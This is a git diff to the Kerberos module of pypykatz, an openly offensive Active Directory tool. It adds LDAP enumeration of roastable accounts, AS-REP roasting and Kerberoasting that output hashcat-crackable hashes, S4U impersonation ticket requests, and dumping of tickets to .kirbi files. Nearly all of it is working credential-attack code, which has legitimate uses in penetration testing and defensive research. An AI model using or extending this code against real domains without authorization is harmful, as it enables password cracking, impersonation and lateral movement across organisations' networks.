@@ -4,6 +4,7 @@
 #  Tamas Jos (@skelsec)
 #
 
+import os
 import base64
 import platform
 import argparse
@@ -12,6 +13,7 @@ from pypykatz import logger
 import traceback
 
 from minikerberos.common.utils import print_table
+from minikerberos.protocol.asn1_structs import KRB_CRED
 from pypykatz.commons.filetime import filetime_to_dt
 from pypykatz.commons.common import geterr
 from pypykatz.kerberos.kerberos import get_TGS, get_TGT, generate_targets, \
@@ -19,6 +21,11 @@ from pypykatz.kerberos.kerberos import get_TGS, get_TGT, generate_targets, \
 	del_ccache, roast_ccache, ccache_to_kirbi, kirbi_to_ccache
 
 from pypykatz.kerberos.kirbiutils import parse_kirbi, format_kirbi, print_kirbi
+from msldap.commons.url import MSLDAPURLDecoder
+from minikerberos.common.spn import KerberosSPN
+from minikerberos.common.creds import KerberosCredential
+
+
 
 """
 Kerberos is not part of pypykatz directly. 
@@ -114,11 +121,13 @@ class KerberosCMDHelper:
 		tgt_parser = kerberos_subparsers.add_parser('tgt', help = 'Fetches a TGT for a given user')
 		tgt_parser.add_argument('url', help='user credentials in URL format. Example: "kerberos+password://TEST\\victim:Passw0rd!1@10.10.10.2"')
 		tgt_parser.add_argument('-o','--out-file', help='Output file to store the TGT in. CCACHE format.')
+		tgt_parser.add_argument('-e','--etype', type=int, default=None, help='Encryption type to be requested')
 
 		tgs_parser = kerberos_subparsers.add_parser('tgs', help = 'Fetches a TGS for a given service/user')
 		tgs_parser.add_argument('url', help='user credentials in URL format')
 		tgs_parser.add_argument('spn', help='SPN string of the service to request the ticket for')
 		tgs_parser.add_argument('-o','--out-file', help='Output file to store the TGT in. CCACHE format.')
+		tgs_parser.add_argument('-e','--etype', type=int, default=None, help='Encryption type to be requested')
 
 		brute_parser = kerberos_subparsers.add_parser('brute', help = 'Bruteforcing usernames')
 		brute_parser.add_argument('-d','--domain', help='Domain name (realm). This overrides any other domain spec that the users might have.')
@@ -128,18 +137,20 @@ class KerberosCMDHelper:
 		brute_parser.add_argument('targets', nargs='*', help = 'username or file with usernames(one per line). Must be in username@domain format, unless you specified --domain then only the username is needed.You can specify mutliple usernames or files separated by space')
 
 		asreproast_parser = kerberos_subparsers.add_parser('asreproast', help='asreproast')
+		asreproast_parser.add_argument('-l','--ldap', help='LDAP URL. Load targets via LDAP connection to the DC.')
 		asreproast_parser.add_argument('-d','--domain', help='Domain name (realm). This overrides any other domain spec that the users might have.')
 		asreproast_parser.add_argument('-e','--etype', type=int, default=23, help='Encryption type to be requested')
 		asreproast_parser.add_argument('-o','--out-file', help='Output file to store the tickets in hashcat crackable format.')
 		asreproast_parser.add_argument('address', help='Kerberos server IP/hostname')
-		asreproast_parser.add_argument('targets', nargs='*', help = 'username or file with usernames(one per line). Must be in username@domain format, unless you specified --domain then only the username is needed.You can specify mutliple usernames or files separated by space')
+		asreproast_parser.add_argument('-t', '--targets', nargs='*', help = 'username or file with usernames(one per line). Must be in username@domain format, unless you specified --domain then only the username is needed.You can specify mutliple usernames or files separated by space')
 
 		spnroast_parser = kerberos_subparsers.add_parser('spnroast', help = 'kerberoast/spnroast')
+		spnroast_parser.add_argument('-l','--ldap', help='LDAP URL. Load targets via LDAP connection to the DC.')
 		spnroast_parser.add_argument('-d','--domain', help='Domain name (realm). This overrides any other domain spec that the users might have.')
 		spnroast_parser.add_argument('-e','--etype', type=int, default=23, help='Encryption type to be requested')
 		spnroast_parser.add_argument('-o','--out-file', help='Output file to store the tickets in hashcat crackable format.')
-		spnroast_parser.add_argument('url', help='user credentials in URL format')
-		spnroast_parser.add_argument('targets', nargs='*', help = 'username or file with usernames(one per line). Must be in username@domain format, unless you specified --domain then only the username is needed.You can specify mutliple usernames or files separated by space')
+		spnroast_parser.add_argument('url', help='user credentials in Kerberos URL format')
+		spnroast_parser.add_argument('-t', '--targets', nargs='*', help = 'username or file with usernames(one per line). Must be in username@domain format, unless you specified --domain then only the username is needed.You can specify mutliple usernames or files separated by space')
 
 		s4u_parser = kerberos_subparsers.add_parser('s4u', help = 'Gets an S4U2proxy ticket impersonating given user')
 		s4u_parser.add_argument('url', help='user credentials in URL format')
@@ -248,8 +259,15 @@ class KerberosCMDHelper:
 			if args.outdir is not None:
 				for luid in tickets:
 					for ticket in tickets[luid]:
-						with open(args.outdir + 'ticket_%s.kirbi' % 'a', 'wb') as f:
+						try:
+							pt = KRB_CRED.load(ticket['Ticket']).native
+							name = '_'.join(pt['tickets'][0]['sname']['name-string'])
+							name = hex(int(luid)) + '_' + '@'.join([name, pt['tickets'][0]['realm']])
+						except:
+							name = hex(int(luid)) + '_' + os.urandom(4).hex()
+						with open(os.path.join(args.outdir, 'ticket_%s.kirbi' % name), 'wb') as f:
 							f.write(ticket['Ticket'])
+
 			else:
 				for luid in tickets:
 					if len(tickets[luid]) == 0:
@@ -261,10 +279,9 @@ class KerberosCMDHelper:
 		
 
 	def run(self, args):
-		#raise NotImplementedError('Platform independent kerberos not implemented!')
 
 		if args.kerberos_module == 'tgt':
-			kirbi, filename, err = asyncio.run(get_TGT(args.url))
+			kirbi, err = asyncio.run(get_TGT(args.url, override_etype = args.etype))
 			if err is not None:
 				print('[KERBEROS][TGT] Failed to fetch TGT! Reason: %s' % err)
 				return
@@ -276,18 +293,16 @@ class KerberosCMDHelper:
 				print_kirbi(kirbi)
 
 		elif args.kerberos_module == 'tgs':
-			tgs, encTGSRepPart, key, err = asyncio.run(get_TGS(args.url, args.spn))
+			tgs, encTGSRepPart, key, kirbi, err = asyncio.run(get_TGS(args.url, args.spn, override_etype = args.etype))
 			if err is not None:
 				print('[KERBEROS][TGS] Failed to fetch TGS! Reason: %s' % err)
 				return
 
-
 			if args.out_file is not None:
-				pass
+				with open(args.out_file, 'wb') as f:
+					f.write(kirbi.dump())
 			else:
-				print(tgs)
-				print(encTGSRepPart)
-				print(key)
+				print_kirbi(kirbi)
 		
 		elif args.kerberos_module == 'brute':
 			target_spns = generate_targets(args.targets, args.domain)
@@ -297,24 +312,38 @@ class KerberosCMDHelper:
 				return
 
 		elif args.kerberos_module == 'asreproast':
-			target_spns = generate_targets(args.targets, args.domain, to_spn = False)
+			if args.ldap is None:
+				target_spns = generate_targets(args.targets, args.domain, to_spn = False)
+			else:
+				target_spns, _ = asyncio.run(get_ldap_kerberos_targets(args.ldap, target_type = 'asrep'))
 			_, err = asyncio.run(asreproast(args.address, target_spns, out_file = args.out_file, etype = args.etype))
 			if err is not None:
-				print('[KERBEROS][ASREPROAST] Error while enumerating users! Reason: %s' % geterr(err))
+				print('[KERBEROS][ASREPROAST] Error! Reason: %s' % geterr(err))
 				return
 
 		elif args.kerberos_module == 'spnroast':
-			target_spns = generate_targets(args.targets, args.domain, to_spn = True)
+			if args.ldap is None and args.targets is None:
+				raise Exception('Either LDAP URL or targets must be provided')
+			if args.ldap is None:
+				target_spns = generate_targets(args.targets, args.domain, to_spn = True)
+			else:
+				_, target_spns = asyncio.run(get_ldap_kerberos_targets(args.ldap, target_type = 'spn'))
 			_, err = asyncio.run(spnroast(args.url, target_spns, out_file = args.out_file, etype = args.etype))
 			if err is not None:
-				print('[KERBEROS][SPNROAST] Error while enumerating users! Reason: %s' % geterr(err))
+				print('[KERBEROS][SPNROAST] Error! Reason: %s' % geterr(err))
 				return
 
 		elif args.kerberos_module == 's4u':
-			tgs, encTGSRepPart, key, err =  asyncio.run(s4u(args.url, args.spn, args.targetuser, out_file = None))
+			tgs, encTGSRepPart, key, kirbi, err =  asyncio.run(s4u(args.url, args.spn, args.targetuser))
 			if err is not None:
-				print('[KERBEROS][S4U] Error while enumerating users! Reason: %s' % geterr(err))
+				print('[KERBEROS][S4U] Error! Reason: %s' % geterr(err))
 				return
+			
+			if args.out_file is not None:
+				with open(args.out_file, 'wb') as f:
+					f.write(kirbi.dump())
+			else:
+				print_kirbi(kirbi)
 
 		elif args.kerberos_module == 'keytab':
 			process_keytab(args.keytabfile)
@@ -334,3 +363,50 @@ class KerberosCMDHelper:
 		elif args.kerberos_module == 'kirbi':
 			if args.kirbi_module == 'parse':
 				parse_kirbi(args.kirbifile)
+
+
+def get_ldap_url(authmethod = 'ntlm', host = None):
+	from winacl.functions.highlevel import get_logon_info
+	info = get_logon_info()
+
+	logonserver = info['logonserver']
+	if host is not None:
+		logonserver = host
+
+	return 'ldap+sspi-%s://%s\\%s@%s' % (authmethod, info['domain'], info['username'], logonserver)
+
+async def get_ldap_kerberos_targets(ldap_url, target_type = 'all', authmethod = 'ntlm', host = None):
+	if ldap_url == 'auto':
+		ldap_url = get_ldap_url(authmethod = authmethod, host = host)
+	
+	msldap_url = MSLDAPURLDecoder(ldap_url)
+	client = msldap_url.get_client()
+	_, err = await client.connect()
+	if err is not None:
+		raise err
+
+	domain = client._ldapinfo.distinguishedName.replace('DC=','').replace(',','.')
+	spn_users = []
+	asrep_users = []
+
+	if target_type == 'asrep' or target_type == 'all':
+		async for user, err in client.get_all_knoreq_users():
+			if err is not None:
+				raise err
+			cred = KerberosCredential()
+			cred.username = user.sAMAccountName
+			cred.domain = domain
+				
+			asrep_users.append(cred)
+	
+	if target_type == 'spn' or target_type == 'all':
+		async for user, err in client.get_all_service_users():
+			if err is not None:
+				raise err
+			cred = KerberosSPN()
+			cred.username = user.sAMAccountName
+			cred.domain = domain
+				
+			spn_users.append(cred)
+	
+	return asrep_users, spn_users
